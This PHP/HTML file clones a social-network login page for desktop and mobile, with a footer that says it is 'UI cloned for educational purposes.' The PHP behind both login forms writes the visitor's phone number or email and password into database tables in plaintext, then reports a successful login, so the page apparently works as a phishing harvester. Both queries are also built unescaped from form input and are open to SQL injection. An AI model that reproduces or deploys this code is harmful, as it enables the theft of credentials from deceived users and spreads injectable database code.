...
<html lang="en">
  ...
  <body>
    <!-- php area (don't touch this area)-->
    <?php
    $message = '';
    if (isset($_POST['login-btn'])) {
    # code...
    $number = $_POST['log-number'];
    $password = $_POST['log-password'];
    
    
    $query = "INSERT INTO users (user_number , user_password) VALUES ( '$number', '$password')";
    $query_connection = mysqli_query( $connect , $query);
    if (!$query_connection) {
    # code...
    die("Query Faild!" . mysqli_error($connect));
    }
    else{
    $message = '<div class="alert alert-success">Your Login Successfully</div>';
    }
    }
    ?>
    <!-- php area (don't touch this area)-->
          ...
          <div class="loginform">
            ...
            <form action="" method="POST">
              <table>
                ...
                <td><input name="log-number" class="logintext loginfield" type="text" required></td>
                <td><input name="log-password" class="logintext loginrowgap loginfield" type="password" required></td>
                <td><input name="login-btn" class="loginrowgap" id="loginbutton" type="submit" value="Log In"></td>
              </tr>
              <tr>
                <td></td>
        ...
        <div class="signupdiv">
          ...
          <form action="" method="POST">
            <div class="signupform">
              ...
              <input class="mobilepw signuptextbox" type="password" name="sing-password" placeholder="New password" required>
              <br>
              ...
              <div class="clearfix">
                <button type="submit" name="singup-btn" id="signupbutton">Sign Up</button>
              </div>
            </form>
            <div id="createpage">
    ...
    <footer>
      <div id="footersubdiv">
        ...
        <div id="copyrightdiv">
          ...
          <span id="disclaimer">UI cloned for educational purposes by <a href="https://www.linkedin.com/in/md-arif-patwary-88023b1b9/" target="_blank" id="pranavks">Arif Patwary &nbsp<i class="fa fa-linkedin-square"></i></a></span>
        </div>
      </div>
    </footer>
  </div>
  ...
  <?php
  $message2 = "";
  if (isset($_POST['mob-sing-btn'])) {
  # code...
  $mob_num = $_POST['mob-num'];
  $mob_password = $_POST['mob-password'];
  $query2 = " INSERT INTO mob_log_crud (mob_user, mob_password) VALUES ($mob_num, $mob_password)";
  $query_connection2 = mysqli_query($connect, $query2);
  $message2 = '<div class="alert alert-success">Your Login Successfully!</div>';
  }
  ?>
  <!-- php area (don't touch this area)-->
  <div class="maindiv">
    <div class="mobile">
      ...
      <div class="mobmaindiv">
        ...
        <form action="" method="POST">
          <div id="mobtextdiv">
            <input name="mob-num" type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address" required="">
            <input name="mob-password" type="password" class="mobtextbox mobtextbox2" placeholder="Password" required="">
          </div>
          <div class="mobloginbuttondiv">
            <input name="mob-sing-btn" type="submit" class="mobloginbutton" value="Log In">
          </div>
        </form>
        <div id="ordiv">
          <span id="or">or</span>
      ...
      <div class="mobfooter">
        ...
        <div class="mobcopyright">
          ...
          <p id="mobdisclaimer">UI cloned for educational purposes by <span class="arif" href="https://www.linkedin.com/in/md-arif-patwary-88023b1b9/" target="_blank" id="mobpranavks">Arif Patwary &nbsp<i class="fa fa-linkedin-square"></i></span></p>
        </div>
      </div>
    </div>
    <!-- js code  -->
